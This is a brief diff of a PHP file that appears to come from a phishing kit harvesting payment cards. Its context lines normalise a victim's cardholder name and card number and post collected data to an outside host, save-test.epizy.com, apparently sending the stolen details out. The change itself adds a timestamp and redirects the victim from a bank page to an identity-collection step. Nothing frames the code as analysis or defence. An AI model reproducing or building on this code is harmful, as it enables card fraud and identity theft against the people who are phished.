@@ -10,7 +10,7 @@ include('../../functions/get_ip.php');
 $_SESSION['_cardholder_'] = strtoupper($_SESSION['_nameoncard_']);
 $_SESSION['_cardnumber_'] = preg_replace('/\s+/', '', $_SESSION['_cardnumber_']);
 
-
+$_SESSION['TIME_DATE'] = $TIME_DATE;
 ///////////////////////////[CountryA]////////////////////////////////////
 
 function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
@@ -159,7 +159,7 @@ sendPost('http://www.save-test.epizy.com/sv2.php',$data);
 		
 		
 		
-	HEADER("Location: bank.php?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
+	HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
 
 ?>
 
